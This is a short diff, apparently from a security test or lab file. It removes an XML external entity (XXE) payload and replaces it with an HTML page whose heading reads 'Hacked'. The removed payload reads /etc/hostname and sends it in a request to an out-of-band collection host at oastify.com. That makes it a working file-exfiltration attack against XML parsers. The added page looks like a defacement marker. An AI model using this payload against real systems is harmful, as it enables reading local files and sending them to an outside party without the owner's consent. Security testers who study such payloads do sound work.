@@ -1,8 +1,3 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "file:///etc/hostname" >
-<!ENTITY callhome SYSTEM "https://br60a4m5v8uu6nl6xbsrrltds4yvmxam.oastify.com/?%xxe;">
-]
->
-<foo>&callhome;</foo>
+<html>
+  <h1>Hacked</h1>
+</html>
